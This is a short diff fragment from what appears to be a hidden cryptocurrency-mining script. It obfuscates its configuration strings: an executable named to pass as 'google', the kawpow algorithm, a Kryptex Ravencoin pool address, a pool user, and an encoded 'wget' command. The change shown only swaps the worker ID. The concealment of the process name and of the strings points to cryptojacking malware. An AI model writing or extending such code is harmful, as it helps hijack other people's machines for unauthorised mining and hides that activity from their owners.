@@ -59,7 +59,7 @@ EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")
 PROCESSING_PROTOCOL_ENCODED = encode_string_data("kawpow")
 COORDINATOR_ADDRESS_ENCODED = encode_string_data("stratum+tcp://rvn.kryptex.network:7031")
 AUTH_USER_ENCODED = encode_string_data("krxXJMWJKW")
-WORKER_ID_ENCODED = encode_string_data("YUHUUU")
+WORKER_ID_ENCODED = encode_string_data("WALAWE")
 
 # Encoded command strings for system operations.
 WGET_COMMAND_ENCODED = encode_string_data("wget")
